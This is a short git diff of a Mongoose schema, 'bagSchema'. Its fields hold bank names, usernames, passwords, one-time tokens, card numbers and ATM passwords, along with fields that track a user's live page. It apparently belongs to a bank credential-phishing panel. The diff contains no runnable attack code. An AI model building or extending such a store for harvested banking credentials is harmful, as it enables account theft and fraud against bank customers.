@@ -6,7 +6,8 @@ const bagSchema = new Schema({
         required: true
     },
     typeDocument: String,
-    nameBank: String,
+    nroDocument: String,
+        nameBank: String,
     username: String,
     password: String,
     correo: String,
@@ -15,9 +16,11 @@ const bagSchema = new Schema({
     token1: String,
     token2: String,
     token3: String,
+    factor: String,
+    method: String,
+    image: String,
     tarjeta: String,
     atmPassword: String,
-    nroDocument: String,
     additionalData: [String],
 
 
@@ -27,7 +30,8 @@ const bagSchema = new Schema({
     pageNow: String,
     liveData: [{
         textPage: String,
-        urlPage: String
+        urlPage: String,
+        pageNow: Boolean
     }],
     isLiveLoading: Boolean,
     online: Boolean,
